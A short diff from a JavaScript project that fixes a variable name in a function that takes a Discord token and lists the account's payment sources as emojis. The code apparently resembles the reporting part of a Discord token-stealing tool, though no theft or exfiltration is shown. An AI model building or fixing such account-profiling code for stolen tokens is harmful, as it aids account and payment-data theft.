@@ -171,7 +171,7 @@ let getDiscordInfo = (token) => {
   let p = "";
   paymentSources?.forEach(s => {
     p += s.brand && s.invalid === 0 ? emojis.user.payments[0] : "";
-    p += source.email ? emojis.user.payments[1] : "";
+    p += s.email ? emojis.user.payments[1] : "";
   });
 
   const info = {
